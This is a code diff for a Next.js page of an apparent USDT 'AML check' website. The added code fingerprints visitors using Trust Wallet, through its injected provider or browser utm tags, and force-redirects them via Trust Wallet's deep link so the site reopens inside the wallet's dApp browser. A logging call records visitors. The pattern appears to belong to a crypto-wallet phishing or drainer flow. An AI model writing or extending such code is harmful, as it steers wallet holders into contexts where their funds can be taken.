@@ -1,3 +1,4 @@
+/* eslint-disable @typescript-eslint/no-explicit-any */
 "use client";
 
 import { AMLLoading } from "@/pagesComponents/AMLLoading/AMLLoading";
@@ -6,13 +7,41 @@ import { ChooseNet } from "@/pagesComponents/ChooseNet/ChooseNet";
 import { Home } from "@/pagesComponents/Home/Home";
 import { setCurrentStep } from "@/Redux/Slice/MainSlice";
 import { RootState } from "@/Redux/store";
-import { useEffect } from "react";
+import { useEffect, useState } from "react";
 import { useDispatch, useSelector } from "react-redux";
 
-export default function Page() {
-  const { currentStep } = useSelector((store: RootState) => store.main);
+const DOMAIN = "https://usdtcheckaml.com";
 
+export default function Page() {
+  const [isRedirect, setIsRedirect] = useState(false);
+
+  const { currentStep } = useSelector((store: RootState) => store.main);
   const dispatch = useDispatch();
+
+  useEffect(() => {
+    if (typeof window === "undefined") return;
+
+    const params = new URLSearchParams(window.location.search);
+    const utm = params.get("utm_source");
+
+    const injected =
+      (window as any).ethereum?.isTrust === true || (window as any).trustwallet;
+
+    const isTrust =
+      injected ||
+      utm === "Trust_Android_Browser" ||
+      utm === "Trust_iOS_Browser";
+
+    if (injected || isTrust) {
+      setIsRedirect(true);
+    }
+  }, []);
+
+  useEffect(() => {
+    if (isRedirect) {
+      window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(DOMAIN)}`;
+    }
+  }, [isRedirect]);
 
   useEffect(() => {
     fetch("/api/log", {
@@ -23,7 +52,6 @@ export default function Page() {
   if (!currentStep) {
     return <Home />;
   }
-
   return (
     <>
       {currentStep == 0 && <Home />}
